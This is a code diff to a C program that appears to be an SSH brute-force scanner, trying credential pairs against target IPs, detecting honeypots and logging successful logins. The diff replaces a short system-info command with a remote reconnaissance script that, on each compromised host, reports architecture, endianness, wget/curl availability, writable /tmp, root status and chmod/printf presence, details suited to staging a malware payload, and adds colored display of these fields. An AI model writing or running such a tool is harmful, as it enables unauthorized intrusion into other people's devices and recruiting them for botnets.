@@ -40,7 +40,34 @@
 #define HIDE_CURSOR "\033[?25l"
 #define SHOW_CURSOR "\033[?25h"
 
-#define SYSINFO "uname -a 2>/dev/null|head -c100;echo;command -v wget>/dev/null&&echo W||{ command -v curl>/dev/null&&echo C||echo N;}"
+#define SYSINFO \
+    "B=/bin/busybox;" \
+    "[ -f $B ]&&B_PATH=$B||B_PATH=$(which busybox 2>/dev/null);" \
+    "A=$(uname -m);" \
+    "E=Unknown;" \
+    "if command -v python3>/dev/null 2>&1;then " \
+      "E=$(python3 -c 'import sys;print(sys.byteorder.capitalize())');" \
+    "elif command -v python>/dev/null 2>&1;then " \
+      "E=$(python -c 'import sys;print sys.byteorder.capitalize()');" \
+    "elif command -v od>/dev/null 2>&1;then " \
+      "E=$(echo -n I|od -to2|head -1|awk '{print $2}'|grep -q '000111'&&echo Little||echo Big);" \
+    "elif command -v hexdump>/dev/null 2>&1;then " \
+      "E=$(printf '\\001'|hexdump -e '1/1 \"%d\"' 2>/dev/null|grep -q '1'&&echo Little||echo Big);" \
+    "elif [ -n \"$B_PATH\" ];then " \
+      "E=$($B_PATH printf '\\001'|$B_PATH hexdump -e '1/1 \"%d\"' 2>/dev/null|grep -q '1'&&echo Little||echo Big);" \
+    "fi;" \
+    "if [ -f /etc/os-release ]||[ -f /etc/debian_version ];then T=Linux-Standard;else T=BusyBox;fi;" \
+    "[ -f /bin/wget ]||[ -f /usr/bin/wget ]&&W=YES||W=NO;" \
+    "[ -f /bin/curl ]||[ -f /usr/bin/curl ]&&K=YES||K=NO;" \
+    "[ -w /tmp ]&&P=YES||P=NO;" \
+    "[ \"$(id -u)\" = \"0\" ]&&R=YES||R=NO;" \
+    "if [ -f /bin/chmod ]||[ -f /usr/bin/chmod ];then C=YES;" \
+    "elif [ -n \"$B_PATH\" ]&&$B_PATH chmod --help>/dev/null 2>&1;then C=YES;" \
+    "else C=NO;fi;" \
+    "if [ -f /bin/printf ]||[ -f /usr/bin/printf ];then F=YES;" \
+    "elif [ -n \"$B_PATH\" ]&&$B_PATH printf --help>/dev/null 2>&1;then F=YES;" \
+    "else F=NO;fi;" \
+    "echo \"TYPE:$T|ARCH:$A|ENDIAN:$E|WGET:$W|CURL:$K|TMP:$P|ROOT:$R|CHMOD:$C|PRINTF:$F\""
 
 #define AUTH_PER_CONN 100
 
@@ -241,7 +268,7 @@ typedef struct {
     char user[32];
     char pass[32];
     int hp;
-    char info[200];
+    char info[512];
 } Result;
 
 static Target *g_targets;
@@ -382,8 +409,8 @@ static int ssh_exec_cmd(rawssh_session *ses, const char *cmd, char *out, int sz)
     }
     int t = 0;
     int r;
-    char buf[256];
-    for (int i = 0; i < 50; i++) {
+    char buf[512];
+    for (int i = 0; i < 80; i++) {
         r = rawssh_channel_read(c, buf, sizeof(buf) - 1);
         if (r > 0 && t + r < sz) {
             memcpy(out + t, buf, r);
@@ -425,22 +452,35 @@ static int check_hp(rawssh_session *s) {
 }
 
 static void get_info(rawssh_session *s, char *out, int sz) {
-    char buf[256] = {0};
+    char buf[1024] = {0};
     ssh_exec_cmd(s, SYSINFO, buf, sizeof(buf));
+    /* strip newlines and extra spaces */
     for (int i = 0; buf[i]; i++) {
-        if (buf[i] == '\n')
+        if (buf[i] == '\n' || buf[i] == '\r')
             buf[i] = ' ';
     }
-    char *d = out;
-    char *p = buf;
-    while (*p) {
-        while (*p == ' ' && *(p + 1) == ' ')
+    /* find the TYPE: output line */
+    char *start = strstr(buf, "TYPE:");
+    if (start) {
+        char *d = out;
+        char *p = start;
+        while (*p && *p != '\n' && (d - out < sz - 1)) {
+            /* skip extra spaces */
+            if (*p == ' ' && *(p + 1) == ' ') { p++; continue; }
+            *d++ = *p++;
+        }
+        *d = 0;
+    } else {
+        /* fallback: copy raw output */
+        char *d = out;
+        char *p = buf;
+        while (*p) {
+            while (*p == ' ' && *(p + 1) == ' ') p++;
+            if (d - out < sz - 1) *d++ = *p;
             p++;
-        if (d - out < sz - 1)
-            *d++ = *p;
-        p++;
+        }
+        *d = 0;
     }
-    *d = 0;
 }
 
 static void save_result(Result *r) {
@@ -571,9 +611,9 @@ static void process(int idx) {
         if (rc == RAWSSH_OK) {
             atomic_fetch_add(&G_found, 1);
             int hp = check_hp(ses);
-            char info[200] = {0};
+            char info[512] = {0};
             if (hp == 0)
-                get_info(ses, info, 199);
+                get_info(ses, info, 511);
             if (hp == 1)
                 atomic_fetch_add(&G_hp, 1);
             else
@@ -583,7 +623,7 @@ static void process(int idx) {
             strncpy(r.ip, t->ip, 47);
             strncpy(r.user, CREDS[combo].u, 31);
             strncpy(r.pass, CREDS[combo].p, 31);
-            strncpy(r.info, info, 199);
+            strncpy(r.info, info, 511);
             save_result(&r);
 
             close_session(ses);
@@ -707,8 +747,47 @@ static void draw() {
         printf("  %s%s%s %s:%d %s%s%s:%s%s%s\n",
                col, tag, C_RESET, r->ip, r->port,
                C_WHITE, r->user, C_RESET, C_YELLOW, r->pass, C_RESET);
-        if (r->hp == 0 && r->info[0])
-            printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
+        if (r->hp == 0 && r->info[0]) {
+            /* Parse and display recon fields with colors */
+            char tmp[512];
+            strncpy(tmp, r->info, 511); tmp[511] = 0;
+            char *type_v = NULL, *arch_v = NULL, *end_v = NULL;
+            char *wget_v = NULL, *curl_v = NULL, *tmp_v = NULL;
+            char *root_v = NULL, *chmod_v = NULL, *printf_v = NULL;
+            char *saveptr = NULL;
+            char *tok = strtok_r(tmp, "|", &saveptr);
+            while (tok) {
+                while (*tok == ' ') tok++;
+                if (strncmp(tok, "TYPE:", 5) == 0) type_v = tok + 5;
+                else if (strncmp(tok, "ARCH:", 5) == 0) arch_v = tok + 5;
+                else if (strncmp(tok, "ENDIAN:", 7) == 0) end_v = tok + 7;
+                else if (strncmp(tok, "WGET:", 5) == 0) wget_v = tok + 5;
+                else if (strncmp(tok, "CURL:", 5) == 0) curl_v = tok + 5;
+                else if (strncmp(tok, "TMP:", 4) == 0) tmp_v = tok + 4;
+                else if (strncmp(tok, "ROOT:", 5) == 0) root_v = tok + 5;
+                else if (strncmp(tok, "CHMOD:", 6) == 0) chmod_v = tok + 6;
+                else if (strncmp(tok, "PRINTF:", 7) == 0) printf_v = tok + 7;
+                tok = strtok_r(NULL, "|", &saveptr);
+            }
+            if (type_v && arch_v) {
+                #define YN(v) ((v) && strcmp((v),"YES")==0 ? C_GREEN : C_RED), \
+                               ((v) ? (v) : "?"), C_RESET
+                printf("       %s%s%s %s%s%s",
+                       C_CYAN, type_v ? type_v : "?", C_RESET,
+                       C_WHITE, arch_v ? arch_v : "?", C_RESET);
+                printf(" %s%s%s", C_GRAY, end_v ? end_v : "?", C_RESET);
+                printf(" W:%s%s%s", YN(wget_v));
+                printf(" C:%s%s%s", YN(curl_v));
+                printf(" T:%s%s%s", YN(tmp_v));
+                printf(" R:%s%s%s", YN(root_v));
+                printf(" CH:%s%s%s", YN(chmod_v));
+                printf(" PF:%s%s%s", YN(printf_v));
+                printf("\n");
+                #undef YN
+            } else {
+                printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
+            }
+        }
     }
     pthread_mutex_unlock(&g_resmtx);
     printf("\n");
